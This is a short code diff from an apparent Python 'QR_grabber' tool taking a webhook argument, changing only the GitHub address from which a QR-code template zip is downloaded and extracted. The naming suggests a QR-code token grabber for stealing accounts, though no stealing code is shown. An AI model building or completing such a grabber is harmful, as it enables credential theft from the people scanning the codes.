@@ -91,7 +91,7 @@ def QR_grabber(Webhook):
     SlowPrint(f"\n{Fore.WHITE}Downloading QR Templates!")
 
     urlretrieve(
-        "https://github.com/blackray207/addons/blob/main/QR-Code.zip?raw=true",
+        "https://github.com/SHREK-TM/addons/blob/main/QR-Code.zip?raw=true",
         filename="QR-Code.zip",
     )
     with ZipFile("QR-Code.zip", 'r')as zip2:
